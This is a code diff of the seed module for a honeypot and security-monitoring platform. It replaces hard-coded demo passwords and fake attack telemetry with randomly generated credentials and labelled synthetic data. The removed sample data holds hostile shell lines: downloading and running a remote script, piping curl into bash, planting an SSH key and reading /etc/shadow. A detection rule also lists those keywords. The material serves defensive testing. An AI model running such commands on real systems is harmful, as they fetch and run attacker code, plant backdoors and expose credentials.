@@ -1,283 +1,128 @@
+"""
+Database bootstrap.
+
+* Accounts: created only when the users table is empty. Passwords come from
+  BOOTSTRAP_ADMIN_PASSWORD / BOOTSTRAP_ANALYST_PASSWORD / BOOTSTRAP_VIEWER_PASSWORD; any that
+  are missing are generated randomly and printed ONCE to the console. All bootstrap accounts
+  must change their password on first login.
+* Demo data (SEED_DEMO_DATA=true, empty events table): synthetic attack sessions are pushed
+  through the real pipeline with past timestamps, so alerts/incidents are genuinely derived.
+  Everything is labelled data_origin="simulated" and uses RFC 5737 documentation IPs.
+  Demo IOCs are flagged is_demo=True and are not real intelligence.
+"""
 import datetime
-import random
-import uuid
 import json
+import logging
+import random
+import secrets
+import string
+
 from sqlalchemy.orm import Session
-from app.models import (
-    User, HoneypotEvent, Investigation, InvestigationNote, Alert,
-    DetectionRule, ThreatIntelIOC, AuditLog, PlatformSetting, BackupRecord
-)
+
+from app.config import settings
+from app.models import User, HoneypotEvent, ThreatIntelIOC, PlatformSetting, Asset
 from app.security import get_password_hash
-from app.geoip_service import enrich_ip
 
-SAMPLE_IPS = [
-    "185.220.101.5", "193.142.146.210", "103.253.42.18", "45.154.255.88",
-    "194.26.29.112", "104.244.76.13", "182.61.139.88", "91.240.118.24",
-    "198.51.100.44", "41.216.186.20", "89.248.165.74", "185.156.177.10",
-    "103.107.198.12", "195.123.214.45", "185.234.218.11", "91.191.209.12"
-]
+logger = logging.getLogger("cyvantis.seed")
 
-SAMPLE_USERNAMES = ["root", "admin", "user", "support", "ubuntu", "oracle", "postgres", "guest", "test", "cisco", "service", "sysadmin"]
-SAMPLE_PASSWORDS = ["123456", "admin", "password", "root", "12345678", "pass123", "toor", "cisco123", "admin123", "1234", "qwerty", "welcome"]
-SAMPLE_COMMANDS = [
-    "uname -a",
-    "cat /etc/passwd",
-    "wget http://185.220.101.5/malware.sh -O /tmp/m.sh && chmod +x /tmp/m.sh && /tmp/m.sh",
-    "curl -s http://193.142.146.210/miner | bash",
-    "ls -la /root",
-    "whoami",
-    "id",
-    "netstat -tulpn",
-    "ps aux | grep miner",
-    "rm -rf /tmp/*",
-    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...' >> ~/.ssh/authorized_keys",
-    "cat /etc/shadow",
-    "crontab -l"
-]
 
-EVENT_TYPES = [
-    ("cowrie.login.failed", 50),
-    ("cowrie.login.success", 20),
-    ("cowrie.command.input", 20),
-    ("cowrie.session.file_download", 5),
-    ("cowrie.session.connect", 5)
-]
+def _random_password() -> str:
+    alphabet = string.ascii_letters + string.digits + "!@#%^*-_"
+    while True:
+        pw = "".join(secrets.choice(alphabet) for _ in range(20))
+        if any(c.islower() for c in pw) and any(c.isupper() for c in pw) and any(c.isdigit() for c in pw):
+            return pw
+
+
+def _seed_users(db: Session):
+    if db.query(User).count() > 0:
+        return
+    specs = [
+        ("admin", "admin@cyvantis.local", "SOC Administrator", "admin", settings.BOOTSTRAP_ADMIN_PASSWORD),
+        ("analyst", "analyst@cyvantis.local", "SOC Analyst", "analyst", settings.BOOTSTRAP_ANALYST_PASSWORD),
+        ("viewer", "viewer@cyvantis.local", "Read-only Observer", "viewer", settings.BOOTSTRAP_VIEWER_PASSWORD),
+    ]
+    generated = []
+    for username, email, name, role, pw in specs:
+        if not pw:
+            pw = _random_password()
+            generated.append((username, pw))
+        db.add(User(username=username, email=email, full_name=name, role=role, hashed_password=get_password_hash(pw),
+                    is_active=True, must_change_password=True))
+    db.commit()
+    if generated:
+        lines = "\n".join(f"      {u}: {p}" for u, p in generated)
+        # Printed once on first boot so the operator can log in; not stored anywhere else.
+        print("[!] ================================================================\n"
+              "[!] Bootstrap accounts created with RANDOM passwords (shown only once):\n"
+              f"{lines}\n"
+              "[!] Set BOOTSTRAP_*_PASSWORD env vars to choose them. Change on first login.\n"
+              "[!] ================================================================", flush=True)
+
+
+def _seed_settings(db: Session):
+    if db.query(PlatformSetting).count() > 0:
+        return
+    db.add_all([
+        PlatformSetting(key="PLATFORM_NAME", value="CYVANTIS AEGISNEX", description="Platform Branding Title"),
+        PlatformSetting(key="COWRIE_SYNC_ENABLED", value="true", description="Cowrie Live Monitoring Status"),
+        PlatformSetting(key="ALERT_THRESHOLD_ATTEMPTS", value="5", description="Failed login alert threshold"),
+        PlatformSetting(key="DATA_RETENTION_DAYS", value="90", description="Days to retain event logs"),
+        PlatformSetting(key="GEOIP_AUTO_ENRICHMENT", value="true", description="Offline GeoIP labelling"),
+        PlatformSetting(key="SIMULATION_INTERVAL", value=str(settings.SIMULATION_INTERVAL_SECONDS), description="Seconds between simulated events"),
+    ])
+    db.commit()
+
+
+def _seed_demo(db: Session):
+    from app.ingestion.sources import SyntheticSource, SYNTH_HASH, SYNTH_DST, SYNTH_SENSOR
+    from app.pipeline import process_events
+
+    if db.query(ThreatIntelIOC).count() == 0:
+        db.add_all([
+            ThreatIntelIOC(indicator="203.0.113.200", ioc_type="ip", threat_score=90, category="Payload host (demo)",
+                           description="DEMO indicator - RFC 5737 documentation address used by synthetic telemetry",
+                           source="Demo seed", confidence=0.6, is_demo=True),
+            ThreatIntelIOC(indicator=SYNTH_HASH, ioc_type="hash", threat_score=95, category="Dropper (demo)",
+                           description="DEMO indicator - synthetic payload hash", source="Demo seed", confidence=0.6, is_demo=True),
+            ThreatIntelIOC(indicator="198.51.100.77", ioc_type="ip", threat_score=75, category="Brute-force source (demo)",
+                           description="DEMO indicator - RFC 5737 documentation address", source="Demo seed",
+                           confidence=0.5, is_demo=True),
+        ])
+        db.commit()
+    if db.query(Asset).count() == 0:
+        db.add(Asset(name=SYNTH_SENSOR, ip_address=SYNTH_DST, criticality=3, exposure="internet",
+                     services=[{"port": 22, "service": "ssh"}, {"port": 23, "service": "telnet"}], cves=[],
+                     description="Demo honeypot sensor (synthetic telemetry target)"))
+        db.commit()
+    if db.query(HoneypotEvent).count() > 0:
+        return
+    rng = random.Random(1337)  # deterministic demo history
+    src = SyntheticSource(rng=rng)
+    now = datetime.datetime.utcnow()
+    events = []
+    for i in range(40):
+        src._new_session()
+        start = now - datetime.timedelta(hours=rng.uniform(0.2, 48))
+        for j, rec in enumerate(src._queue):
+            rec["timestamp"] = (start + datetime.timedelta(seconds=7 * j)).isoformat() + "Z"
+            rec["uuid"] = f"seed-{i}-{j}"
+        from app.ingestion.cowrie import parse_cowrie_line
+        for rec in src._queue:
+            ev = parse_cowrie_line(json.dumps(rec), data_origin="simulated")
+            ev.source = "synthetic"
+            events.append(ev)
+        src._queue.clear()
+    events.sort(key=lambda e: e.timestamp)
+    res = process_events(db, events)
+    db.commit()
+    logger.info("Seeded %d synthetic demo events (%d alerts) - labelled data_origin=simulated", res.stored, res.alerts_created)
+
 
 def seed_database(db: Session):
-    # 1. Seed Users if not present
-    if not db.query(User).filter(User.username == "admin").first():
-        admin = User(
-            username="admin",
-            email="admin@cyvantis.soc",
-            hashed_password=get_password_hash("Admin@Cyvantis2026!"),
-            full_name="SOC Chief Administrator",
-            role="admin",
-            is_active=True,
-            must_change_password=True,
-            created_at=datetime.datetime.utcnow() - datetime.timedelta(days=30)
-        )
-        analyst = User(
-            username="analyst",
-            email="analyst@cyvantis.soc",
-            hashed_password=get_password_hash("Analyst@Cyvantis2026!"),
-            full_name="Lead Cyber Threat Analyst",
-            role="analyst",
-            is_active=True,
-            must_change_password=True,
-            created_at=datetime.datetime.utcnow() - datetime.timedelta(days=20)
-        )
-        viewer = User(
-            username="viewer",
-            email="viewer@cyvantis.soc",
-            hashed_password=get_password_hash("Viewer@Cyvantis2026!"),
-            full_name="Audit Observer",
-            role="viewer",
-            is_active=True,
-            must_change_password=True,
-            created_at=datetime.datetime.utcnow() - datetime.timedelta(days=10)
-        )
-        db.add_all([admin, analyst, viewer])
-        try:
-            db.commit()
-            print("[+] Users seeded successfully.")
-        except Exception:
-            db.rollback()
-
-    admin_user = db.query(User).filter(User.username == "admin").first()
-    analyst_user = db.query(User).filter(User.username == "analyst").first()
-
-    # 2. Seed Platform Settings
-    if db.query(PlatformSetting).count() == 0:
-        settings_items = [
-            PlatformSetting(key="PLATFORM_NAME", value="CYVANTIS AEGISNEX", description="Platform Branding Title"),
-            PlatformSetting(key="COWRIE_SYNC_ENABLED", value="true", description="Cowrie Live Monitoring Status"),
-            PlatformSetting(key="ALERT_THRESHOLD_ATTEMPTS", value="5", description="Failed login alert threshold"),
-            PlatformSetting(key="DATA_RETENTION_DAYS", value="90", description="Days to retain event logs"),
-            PlatformSetting(key="GEOIP_AUTO_ENRICHMENT", value="true", description="Automatic GeoIP lookup"),
-            PlatformSetting(key="SIMULATION_INTERVAL", value="3.0", description="Seconds between simulated events")
-        ]
-        db.add_all(settings_items)
-        db.commit()
-
-    # 3. Seed Detection Rules
-    if db.query(DetectionRule).count() == 0:
-        rules = [
-            DetectionRule(
-                name="SSH Brute Force Attack",
-                description="Triggers when more than 5 failed SSH login attempts occur from a single IP within 5 minutes.",
-                rule_type="brute_force",
-                condition='{"protocol": "SSH", "eventid": "cowrie.login.failed"}',
-                threshold=5,
-                severity="high",
-                is_enabled=True,
-                created_at=datetime.datetime.utcnow() - datetime.timedelta(days=25)
-            ),
-            DetectionRule(
-                name="Suspicious Command Execution",
-                description="Triggers when attackers execute curl/wget payload fetch scripts or shadow file access.",
-                rule_type="command_execution",
-                condition='{"command_contains": ["wget", "curl", "/etc/shadow", "authorized_keys"]}',
-                threshold=1,
-                severity="critical",
-                is_enabled=True,
-                created_at=datetime.datetime.utcnow() - datetime.timedelta(days=25)
-            ),
-            DetectionRule(
-                name="Malware Payload Download",
-                description="Triggers on binary/script honeypot file download events.",
-                rule_type="payload_download",
-                condition='{"eventid": "cowrie.session.file_download"}',
-                threshold=1,
-                severity="critical",
-                is_enabled=True,
-                created_at=datetime.datetime.utcnow() - datetime.timedelta(days=20)
-            ),
-            DetectionRule(
-                name="Telnet Credential Harvesting",
-                description="Detects high volume Telnet authentication scans.",
-                rule_type="brute_force",
-                condition='{"protocol": "Telnet"}',
-                threshold=10,
-                severity="medium",
-                is_enabled=True,
-                created_at=datetime.datetime.utcnow() - datetime.timedelta(days=15)
-            )
-        ]
-        db.add_all(rules)
-        db.commit()
-
-    # 4. Seed Threat Intel IOCs
-    if db.query(ThreatIntelIOC).count() == 0:
-        iocs = [
-            ThreatIntelIOC(indicator="185.220.101.5", ioc_type="ip", threat_score=95, category="Tor Exit Node", description="Known malicious scanner & Tor relay node", source="CYVANTIS Honeypot"),
-            ThreatIntelIOC(indicator="193.142.146.210", ioc_type="ip", threat_score=90, category="Botnet C2", description="Mirai botnet command server", source="AbuseIPDB Sync"),
-            ThreatIntelIOC(indicator="103.253.42.18", ioc_type="ip", threat_score=88, category="Brute Force Scanner", description="High frequency SSH dictionary attack source", source="CYVANTIS Honeypot"),
-            ThreatIntelIOC(indicator="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", ioc_type="hash", threat_score=99, category="CryptoMinerELF", description="XMRig cryptominer binary dropper", source="VirusTotal Mock"),
-            ThreatIntelIOC(indicator="malicious-payload-drop.xyz", ioc_type="domain", threat_score=85, category="Malware Host", description="Staging server for honeypot post-exploitation payloads", source="CYVANTIS Intelligence")
-        ]
-        db.add_all(iocs)
-        db.commit()
-
-    # 5. Seed Honeypot Events (200+ realistic events)
-    if db.query(HoneypotEvent).count() < 100:
-        now = datetime.datetime.utcnow()
-        events = []
-        
-        # Weighted event choice
-        choices = [ev[0] for ev in EVENT_TYPES]
-        weights = [ev[1] for ev in EVENT_TYPES]
-
-        for i in range(220):
-            # Distribute timestamps over last 30 days
-            days_ago = random.uniform(0.01, 30.0)
-            ts = now - datetime.timedelta(days=days_ago)
-            
-            ev_type = random.choices(choices, weights=weights)[0]
-            ip = random.choice(SAMPLE_IPS)
-            geo = enrich_ip(ip)
-            protocol = random.choice(["SSH", "Telnet"])
-            dst_port = 22 if protocol == "SSH" else 23
-
-            username = random.choice(SAMPLE_USERNAMES) if ev_type != "cowrie.session.connect" else None
-            password = random.choice(SAMPLE_PASSWORDS) if ev_type in ["cowrie.login.failed", "cowrie.login.success"] else None
-            command = random.choice(SAMPLE_COMMANDS) if ev_type == "cowrie.command.input" else None
-            file_hash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" if ev_type == "cowrie.session.file_download" else None
-
-            severity = "low"
-            if ev_type == "cowrie.login.success":
-                severity = "high"
-            elif ev_type == "cowrie.command.input":
-                severity = "high" if any(k in (command or "") for k in ["wget", "curl", "shadow"]) else "medium"
-            elif ev_type == "cowrie.session.file_download":
-                severity = "critical"
-
-            ev = HoneypotEvent(
-                eventid=ev_type,
-                timestamp=ts,
-                src_ip=ip,
-                dst_port=dst_port,
-                protocol=protocol,
-                username=username,
-                password=password,
-                command=command,
-                file_hash=file_hash,
-                session_id=str(uuid.uuid4())[:8],
-                duration=round(random.uniform(1.0, 120.0), 2),
-                country=geo["country"],
-                country_code=geo["country_code"],
-                city=geo["city"],
-                asn=geo["asn"],
-                severity=severity,
-                is_simulated=True,
-                raw_payload=json.dumps({"eventid": ev_type, "src_ip": ip, "timestamp": ts.isoformat()})
-            )
-            events.append(ev)
-
-        db.add_all(events)
-        db.commit()
-        print("[+] Seeded 220 realistic Honeypot Events.")
-
-    # 6. Seed Alerts & Investigations
-    if db.query(Alert).count() == 0:
-        alerts = [
-            Alert(
-                timestamp=datetime.datetime.utcnow() - datetime.timedelta(hours=2),
-                title="Brute Force Campaign from 185.220.101.5",
-                description="Over 45 SSH authentication attempts recorded targeting root and admin accounts.",
-                severity="high",
-                rule_name="SSH Brute Force Attack",
-                src_ip="185.220.101.5",
-                status="active",
-                is_acknowledged=False
-            ),
-            Alert(
-                timestamp=datetime.datetime.utcnow() - datetime.timedelta(hours=6),
-                title="Cryptominer Script Ingestion from 193.142.146.210",
-                description="Attacker executed curl -s http://193.142.146.210/miner after unauthorized root login.",
-                severity="critical",
-                rule_name="Suspicious Command Execution",
-                src_ip="193.142.146.210",
-                status="acknowledged",
-                is_acknowledged=True,
-                acknowledged_by_id=analyst_user.id if analyst_user else 1,
-                acknowledged_at=datetime.datetime.utcnow() - datetime.timedelta(hours=5)
-            )
-        ]
-        db.add_all(alerts)
-        db.commit()
-
-    if db.query(Investigation).count() == 0:
-        inv1 = Investigation(
-            title="Operation NightCrawler: Mirai Variant Wave",
-            description="Investigating targeted Telnet/SSH credential dictionary attacks originating from Netherlands and Russia VPS nodes.",
-            severity="critical",
-            status="in_progress",
-            assigned_to_id=analyst_user.id if analyst_user else 1,
-            created_by_id=admin_user.id if admin_user else 1,
-            created_at=datetime.datetime.utcnow() - datetime.timedelta(days=2),
-            related_events="[1, 2, 3, 4, 5]"
-        )
-        db.add(inv1)
-        db.commit()
-        db.refresh(inv1)
-
-        note = InvestigationNote(
-            investigation_id=inv1.id,
-            author_id=analyst_user.id if analyst_user else 1,
-            note_text="Payload hashes confirm variant matches Mirai botnet armv7 payload. IP 193.142.146.210 flagged in AbuseIPDB.",
-            created_at=datetime.datetime.utcnow() - datetime.timedelta(days=1)
-        )
-        db.add(note)
-
-        audit = AuditLog(
-            timestamp=datetime.datetime.utcnow() - datetime.timedelta(days=2),
-            username="admin",
-            action="INVESTIGATION_CREATED",
-            resource="Investigations",
-            details="Opened incident investigation: Operation NightCrawler",
-            ip_address="127.0.0.1"
-        )
-        db.add(audit)
-        db.commit()
-
-    print("[+] Database seeding complete.")
+    from app.detection.engine import ensure_default_rules
+    _seed_users(db)
+    _seed_settings(db)
+    ensure_default_rules(db)
+    if settings.SEED_DEMO_DATA:
+        _seed_demo(db)
